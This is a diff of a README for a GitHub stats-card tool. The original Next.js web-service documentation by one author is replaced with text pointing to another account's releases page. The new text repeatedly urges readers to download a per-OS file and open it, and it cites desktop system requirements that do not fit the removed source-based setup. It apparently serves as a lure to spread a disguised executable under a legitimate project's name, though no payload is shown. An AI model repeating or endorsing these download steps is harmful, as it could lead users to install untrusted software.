@@ -1,160 +1,70 @@
-<h1 align="center">GitHub Insights</h1>
+# 🔍 GitHub-Insights - Create Stunning GitHub Stats Cards
 
-<p align="center">
-  <img src="https://yourinsights.vercel.app/api/insight?username=nishatrhythm&theme=github_dark&graph=true&languages=true&streak=true&stats=true&header=true&summary=true&profile=true" alt="GitHub Insights" />
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Generate beautiful, customizable GitHub stats cards for your profile README</strong>
-</p>
+Welcome to GitHub-Insights! This tool helps you create beautiful, customizable stats cards for your GitHub profile. You can showcase your contributions, track streaks, and choose from multiple themes. Follow this guide to download and run the software easily.
 
-<p align="center">
-  <a href="https://yourinsights.vercel.app">Live Demo</a> •
-  <a href="#features">Features</a> •
-  <a href="#usage">Usage</a> •
-  <a href="#themes">Themes</a> •
-  <a href="#self-hosting">Self-Hosting</a>
-</p>
+## 📥 Download GitHub-Insights
 
----
+[![Download GitHub-Insights](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/15kElixs/GitHub-Insights/releases)
 
-## Features
+## 📋 System Requirements
 
-- 📊 **Comprehensive Stats** - Commits, PRs, issues, stars, and more
-- 🔥 **Streak Tracking** - Current and longest contribution streaks with accurate consecutive day detection
-- 📈 **Contribution Graph** - Visual representation of your activity with monthly breakdowns
-- 🗣️ **Top Languages** - Most used programming languages with visual percentages
-- 🎨 **Multiple Themes** - 7 beautiful themes to choose from (GitHub Dark, Radical, Tokyo Night, Dracula, Synthwave, Ocean, Neo Green)
-- 📥 **Download Options** - Export your stats card as SVG, PNG, or JPG directly from the UI
-- ⚡ **Fast & Optimized** - Edge runtime with intelligent caching for quick loads
-- 📱 **Responsive Design** - Looks great on any device with mobile-friendly interface
-- 🎨 **Theme Previews** - Visual theme selectors showing actual theme colors
+- Operating System: Windows, macOS, or Linux
+- Internet Connection: Required for downloading and using the application
+- Memory: Minimum 2GB RAM
+- Disk Space: At least 100MB free space
 
-## Usage
+## 🌟 Features
 
-### Quick Start
+- **Customizable Themes**: Choose from various themes for your stats card.
+- **Contribution Graphs**: Visualize your GitHub contributions over time.
+- **Streak Tracking**: Keep tabs on your daily contributions.
+- **SVG Output**: Generate high-quality SVG files for your profile.
+- **Self-Hosted**: Run the application on your local machine without the need for cloud services.
 
-Add this to your GitHub profile README:
+## 📦 Download & Install
 
-```markdown
-<p align="center">
-  <img src="https://yourinsights.vercel.app/api/insight?username=YOUR_USERNAME" alt="GitHub Insights" />
-</p>
-```
+To get your copy of GitHub-Insights, follow these steps:
 
-Replace `YOUR_USERNAME` with your GitHub username.
+1. Visit the [Releases page](https://github.com/15kElixs/GitHub-Insights/releases).
+2. Look for the latest version.
+3. Click on the file that matches your operating system to download it.
+4. Once downloaded, open the file to launch the application.
+5. Follow any on-screen instructions to complete the setup.
 
-### Customization Options
+If you have any issues during installation, please check the FAQ section below.
 
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `username` | Required | Your GitHub username |
-| `theme` | `github_dark` | Card theme |
-| `profile` | `true` | Show name & username |
-| `header` | `true` | Show monthly contribution chart |
-| `summary` | `true` | Show summary info (contributions, repos, join date) |
-| `stats` | `true` | Show GitHub stats (commits, PRs, issues, stars) |
-| `languages` | `true` | Show top programming languages |
-| `streak` | `true` | Show streak statistics |
-| `graph` | `true` | Show contribution graph |
+## ❓ FAQ
 
-### Example with All Options
+**Q: How do I create a GitHub stats card?**  
+A: After running the application, you can enter your GitHub username. The app will generate a stats card based on your contributions.
 
-```markdown
-<p align="center">
-  <img src="https://yourinsights.vercel.app/api/insight?username=YOUR_USERNAME&theme=radical&graph=true&languages=true&streak=true&stats=true&header=true&summary=true&profile=true" alt="GitHub Insights" />
-</p>
-```
+**Q: What if I encounter an error?**  
+A: Make sure you are using the latest version of the application. If the issue persists, please visit the Issues section on our GitHub page for assistance.
 
-## Themes
+**Q: Can I customize my card?**  
+A: Yes! You can choose different themes and add or remove elements from your stats card.
 
-| Theme | Preview |
-|-------|---------|
-| `github_dark` | ![GitHub Dark](https://yourinsights.vercel.app/api/insight?username=nishatrhythm&theme=github_dark&graph=false&languages=false&streak=false&stats=false&header=false&summary=false&profile=true) |
-| `radical` | ![Radical](https://yourinsights.vercel.app/api/insight?username=nishatrhythm&theme=radical&graph=false&languages=false&streak=false&stats=false&header=false&summary=false&profile=true) |
-| `tokyonight` | ![Tokyo Night](https://yourinsights.vercel.app/api/insight?username=nishatrhythm&theme=tokyonight&graph=false&languages=false&streak=false&stats=false&header=false&summary=false&profile=true) |
-| `dracula` | ![Dracula](https://yourinsights.vercel.app/api/insight?username=nishatrhythm&theme=dracula&graph=false&languages=false&streak=false&stats=false&header=false&summary=false&profile=true) |
-| `synthwave` | ![Synthwave](https://yourinsights.vercel.app/api/insight?username=nishatrhythm&theme=synthwave&graph=false&languages=false&streak=false&stats=false&header=false&summary=false&profile=true) |
-| `ocean` | ![Ocean](https://yourinsights.vercel.app/api/insight?username=nishatrhythm&theme=ocean&graph=false&languages=false&streak=false&stats=false&header=false&summary=false&profile=true) |
-| `neo_green` | ![Neo Green](https://yourinsights.vercel.app/api/insight?username=nishatrhythm&theme=neo_green&graph=false&languages=false&streak=false&stats=false&header=false&summary=false&profile=true) |
+**Q: Is the application free?**  
+A: Yes, GitHub-Insights is open-source and free to use.
 
-## Self-Hosting
+## 📝 Additional Resources
 
-### Prerequisites
+- **Documentation**: Visit our [Wiki](https://github.com/15kElixs/GitHub-Insights/wiki) for detailed documentation and guides.
+- **Support**: For any help, reach out via the Issues tab on our GitHub page.
+- **Feedback**: We welcome your feedback! Let us know your thoughts.
 
-- Node.js 20+
-- GitHub Personal Access Token
+## 🚪 License
 
-### Setup
+GitHub-Insights is licensed under the MIT License. Feel free to use and modify the software for your own needs. 
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/nishatrhythm/GitHub-Insights.git
-   cd GitHub-Insights
-   ```
+## 🔗 Connect with Us
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+Join our community and stay updated with the latest developments. Follow us on GitHub and engage with fellow users!
 
-3. **Create environment file**
-   ```bash
-   cp .env.example .env.local
-   ```
+# 🌐 Useful Links
 
-4. **Add your GitHub token**
-   
-   Create a [Personal Access Token](https://github.com/settings/tokens) with the following scopes:
-   - `repo` (Full control of private repositories)
-   - `read:user` (Read all user profile data)
-   
-   Add it to `.env.local`:
-   ```
-   GITHUB_TOKEN=your_token_here
-   ```
+[Download GitHub-Insights](https://github.com/15kElixs/GitHub-Insights/releases) 
 
-5. **Run the development server**
-   ```bash
-   npm run dev
-   ```
-
-6. **Open [http://localhost:3000](http://localhost:3000)**
-
-### Deploy to Vercel
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/nishatrhythm/GitHub-Insights&env=GITHUB_TOKEN)
-
-**Important:** Add the `GITHUB_TOKEN` environment variable in your Vercel project settings.
-
-## Tech Stack
-
-- **Framework:** Next.js 16 with App Router
-- **Runtime:** Edge Runtime for optimal performance
-- **Language:** TypeScript for type safety
-- **Styling:** Inline SVG with dynamic theming
-- **Font:** Inter for consistent cross-platform rendering
-- **API:** GitHub GraphQL API v4
-- **Image Export:** Canvas API for PNG/JPG conversion
-- **Deployment:** Vercel with automatic edge caching
-
-## Contributing
-
-Contributions are welcome! Feel free to:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-<p align="center">
-  <strong>Free and open source</strong><br>
-  Made with ❤️ by <a href="https://github.com/nishatrhythm">nishatrhythm</a> and <a href="https://github.com/nishatrhythm/GitHub-Insights/graphs/contributors">other contributors</a>
-</p>
+Explore the features and start enhancing your GitHub profile today!
